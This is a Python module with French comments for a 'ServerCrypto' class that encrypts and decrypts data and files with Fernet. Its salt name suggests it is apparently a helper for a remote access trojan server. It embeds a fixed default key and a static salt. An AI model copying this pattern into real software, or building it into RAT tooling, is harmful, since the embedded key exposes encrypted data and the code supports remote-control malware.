from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import os

class ServerCrypto:
    def __init__(self, password=None):
        if password:
            self.key = self._derive_key(password)
        else:
            # cle par defaut
            self.key = b'ZmDfcTF7_60GrrY167zsiPd67pEvs0aGOv2oasOM1Pg='
            
        self.cipher = Fernet(self.key)
        
    def _derive_key(self, password):
        # derive une cle depuis un mot de passe
        salt = b'rat_server_salt'  # en prod faudrait randomiser
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key
        
    def generate_new_key(self):
        # genere une nouvelle cle
        return Fernet.generate_key()
        
    def encrypt_data(self, data):
        # chiffre des donnees
        if isinstance(data, str):
            data = data.encode()
        return self.cipher.encrypt(data)
        
    def decrypt_data(self, encrypted_data):
        # dechiffre des donnees
        return self.cipher.decrypt(encrypted_data)
        
    def encrypt_file(self, filepath, output_path=None):
        # chiffre un fichier
        try:
            with open(filepath, "rb") as f:
                data = f.read()
                
            encrypted = self.encrypt_data(data)
            
            if not output_path:
                output_path = filepath + ".encrypted"
                
            with open(output_path, "wb") as f:
                f.write(encrypted)
                
            return output_path
        except Exception:
            return None